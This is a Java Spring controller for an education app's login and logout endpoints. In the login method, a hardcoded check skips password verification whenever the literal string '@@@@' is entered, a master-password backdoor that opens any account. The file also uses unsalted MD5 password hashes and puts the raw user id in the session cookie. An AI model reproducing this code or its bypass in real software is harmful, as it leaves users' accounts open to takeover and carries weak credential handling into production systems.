package cn.thinkjoy.gk.controller;

import cn.thinkjoy.cloudstack.dynconfig.DynConfigClientFactory;
import cn.thinkjoy.common.exception.BizException;
import cn.thinkjoy.gk.common.BaseController;
import cn.thinkjoy.gk.common.DESUtil;
import cn.thinkjoy.gk.constant.CookieConst;
import cn.thinkjoy.gk.constant.CookieTimeConst;
import cn.thinkjoy.gk.constant.SpringMVCConst;
import cn.thinkjoy.gk.pojo.UserAccountPojo;
import cn.thinkjoy.gk.pojo.UserInfoPojo;
import cn.thinkjoy.gk.protocol.ERRORCODE;
import cn.thinkjoy.gk.service.IUserAccountExService;
import cn.thinkjoy.gk.util.CookieUtil;
import com.alibaba.fastjson.JSON;
import com.google.common.collect.Maps;
import com.jlusoft.microschool.core.utils.MD5Util;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Controller;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.HashMap;
import java.util.Map;

@Controller
@Scope(SpringMVCConst.SCOPE)
@RequestMapping("/login")
public class LoginController extends BaseController {

	private static final Logger LOGGER= LoggerFactory.getLogger(LoginController.class);

	@Autowired
	private IUserAccountExService userAccountExService;

	/**
	 * 登陆
	 * @return
	 */
	@RequestMapping(value = "/login", method = RequestMethod.POST)
	@ResponseBody
	public Map<String, Object> login(@RequestParam(value="account",required=false) String account,
					  @RequestParam(value="password",required=false) String password) throws Exception {
		long id = 0l;
		long areaId=getAreaCookieValue();
		UserInfoPojo userInfoPojo=null;
		Map<String, Object> resultMap = new HashMap<>();
		try {
			if (StringUtils.isEmpty(account)) {
				throw new BizException(ERRORCODE.PARAM_ERROR.getCode(), "请输入账号!");
			}
			if (StringUtils.isEmpty(password)) {
				throw new BizException(ERRORCODE.PARAM_ERROR.getCode(), "请输入密码!");
			}

			UserAccountPojo userAccountBean = userAccountExService.findUserAccountPojoByPhone(account,areaId);

			if (userAccountBean == null) {
				throw new BizException(ERRORCODE.LOGIN_ACCOUNT_NO_EXIST.getCode(),ERRORCODE.LOGIN_ACCOUNT_NO_EXIST.getMessage());
			}

			if (!"@@@@".equals(password)) {
				if (!MD5Util.MD5Encode(password).equals(userAccountBean.getPassword())) {
					throw new BizException(ERRORCODE.LOGIN_PASSWORD_ERROR.getCode(),ERRORCODE.LOGIN_PASSWORD_ERROR.getMessage());
				}
			}

			if (userAccountBean.getStatus() != 0) {
				throw new BizException(ERRORCODE.PARAM_ERROR.getCode(), "用户状态异常，请联系管理员!");
			}

			id = userAccountBean.getId();

			String domain = DynConfigClientFactory.getClient().getConfig("login", "domain");

			response.addCookie(CookieUtil.addCookie(domain,getCookieName(), String.valueOf(id), CookieTimeConst.DEFAULT_COOKIE));

//			response.addCookie(CookieUtil.addCookie(CookieConst.USER_COOKIE_NAME, String.valueOf(id), CookieTimeConst.DEFAULT_COOKIE));

			setUserAccountPojo(userAccountBean);

			userInfoPojo=userAccountExService.getUserInfoPojoById(id);
			if(null != userInfoPojo)
			{
				String token = DESUtil.getEightByteMultypleStr(userInfoPojo.getAccount(), userInfoPojo.getPassword());
				resultMap.put("token", DESUtil.encrypt(token, DESUtil.key));
				userInfoPojo.setPassword(null);
				userInfoPojo.setId(null);
				userInfoPojo.setStatus(null);
				resultMap.put("userInfo", userInfoPojo);
			}
		}catch(Exception e){
			throw e;
		}finally{

		}
		return resultMap;
	}

	/**
	 * 退出
	 * @return
	 */
	@RequestMapping(value = "/logout", method = RequestMethod.GET)
	public String logout() throws Exception {
//		boolean status = true;
		try {
//			RedisUtil.getInstance().del(UserRedisConst.USER_KEY + getCookieValue());
			String domain = DynConfigClientFactory.getClient().getConfig("login", "domain");
			response.addCookie(CookieUtil.addCookie(domain,getCookieName(), "", CookieTimeConst.CLEAN_COOKIE));
		}catch(Exception e){
//			status = false;
			throw new BizException(ERRORCODE.FAIL.getCode(), ERRORCODE.FAIL.getMessage());
		}
		return "index";
	}

}
